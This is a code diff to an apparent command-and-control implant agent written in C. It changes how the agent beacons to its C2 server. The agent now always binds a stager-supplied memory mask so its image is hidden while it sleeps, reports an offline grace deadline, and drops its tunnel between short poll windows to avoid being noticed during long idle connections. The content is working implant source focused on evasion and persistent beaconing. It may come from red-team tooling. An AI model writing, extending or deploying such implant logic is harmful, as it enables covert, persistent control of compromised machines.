@@ -129,7 +129,10 @@ static void obuf_append(obuf *b, const char *s, size_t n) {
  * agent code while the image is masked.
  */
 static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
-  if (cfg->is_run_by_stager && c2_stager_masked_sleep(secs) == 0)
+  /* The stager publishes the mask next to the agent. Use it whenever it is
+   * present, even if an older embedded config forgot to set IsRunByStager;
+   * a standalone agent has no valid GS block, so bind simply fails. */
+  if (c2_stager_mask_available() && c2_stager_masked_sleep(secs) == 0)
     return;
   /* No in-place masker: a supervising parent reclaims the process instead. */
   if (cfg->is_run_by_stager && c2_agent_identity_supervisor_present())
@@ -141,6 +144,7 @@ static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
 /* The C agent masks the idle gap between poll windows. The default profile is
  * 30-60s of masked sleep, matching the shipped C agent config. */
 #define C2_DEFAULT_POLL_INTERVAL 60
+#define C2_DEFAULT_POLL_WINDOW 5
 #define C2_DEFAULT_JITTER_PERCENT 50
 #define C2_MAX_POLL_INTERVAL 86400
 
@@ -841,10 +845,10 @@ __attribute__((visibility("default"))) int main(void) {
     return 1;
   }
   cfg.magic_string = magic;
-  /* The stager maps a mask entry point beside the agent; read it before the
-   * first idle sleep so the existing sleep cycle can mask in place. */
-  if (cfg.is_run_by_stager)
-    (void)c2_stager_mask_bind();
+  /* The stager maps a mask entry point beside the agent; probe it
+   * unconditionally. Non-stager launches fail validation and keep normal
+   * sleep behavior. */
+  (void)c2_stager_mask_bind();
   TRACE("[agent] cfg host=%.*s http_port=%.*s mode=%.*s\n",
         (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
         cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
@@ -895,17 +899,35 @@ __attribute__((visibility("default"))) int main(void) {
     TRACE("[agent] gather info failed: %d\n", st);
     return 1;
   }
-
-  /* Keep the agent alive across C2 restarts, network drops and tunnel
-   * teardown: check in, bring up the message tunnel, run jobs, and reconnect
-   * when the tunnel closes (the Go agent behaves the same way). */
-  for (;;) {
-    if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
-      TRACE("[agent] checkin failed: %d\n", st);
-      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
-      continue;
+  /* The agent decides its own removal deadline. A non-masked agent reports
+   * nothing and is removed as soon as its tunnel closes. */
+  if (c2_stager_mask_available()) {
+    int64_t grace = cfg.offline_grace;
+    if (grace <= 0) {
+      int32_t window = cfg.poll_window > 0 ? cfg.poll_window
+                                          : C2_DEFAULT_POLL_WINDOW;
+      unsigned interval = c2_poll_interval_seconds(&cfg);
+      grace = (int64_t)interval + window + interval / 2;
     }
-    TRACE("[agent] checkin ok\n");
+    info.has_offline_grace = 1;
+    info.offline_grace = grace;
+  }
+
+  /* Check in once, then beacon on the message route. A short read window
+   * means an idle agent closes the tunnel and masks instead of being pinned
+   * by the C2's 35-70s HTTP long-poll. Commands issued while it sleeps are
+   * queued by the C2 and delivered by the next hello. */
+  int need_checkin = 1;
+  for (;;) {
+    if (need_checkin) {
+      if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
+        TRACE("[agent] checkin failed: %d\n", st);
+        agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
+        continue;
+      }
+      TRACE("[agent] checkin ok\n");
+      need_checkin = 0;
+    }
 
     c2_str msg_caps_items[1] = {cfg.routes.msg};
     c2_str_list msg_caps = {msg_caps_items, 1, 1};
@@ -913,31 +935,31 @@ __attribute__((visibility("default"))) int main(void) {
     if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
                                     &msg_caps, &msg)) != C2_OK) {
       TRACE("[agent] msg route open failed: %d\n", st);
+      need_checkin = 1;
       agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
       continue;
     }
     if ((st = c2_session_hello(&s, &msg, 1)) != C2_OK) {
       TRACE("[agent] hello failed: %d\n", st);
       c2_secureconn_close(&msg);
+      need_checkin = 1;
       agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
       continue;
     }
     TRACE("[agent] hello sent\n");
 
+    int tunnel_failed = 0;
     for (;;) {
       c2_msgtun m;
       memset(&m, 0, sizeof(m));
       int is_job = 0;
       if ((st = c2_session_read(&s, &msg, &m, &is_job)) != C2_OK) {
         if (st == C2_ERR_TIMEOUT) {
-          /* No work: mask for the configured sleep interval, then keep the
-           * same tunnel alive with a keepalive hello. */
-          TRACE("[agent] idle, masking\n");
-          agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
-          (void)c2_session_hello(&s, &msg, 0);
-          continue;
+          TRACE("[agent] idle poll window elapsed, sleeping\n");
+          break;
         }
         TRACE("[agent] read failed: %d\n", st);
+        tunnel_failed = 1;
         break;
       }
       if (!is_job)
@@ -952,7 +974,9 @@ __attribute__((visibility("default"))) int main(void) {
     }
 
     c2_secureconn_close(&msg);
-    TRACE("[agent] tunnel closed, reconnecting\n");
+    if (tunnel_failed)
+      need_checkin = 1;
+    TRACE("[agent] masked sleep\n");
     agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
   }
 }
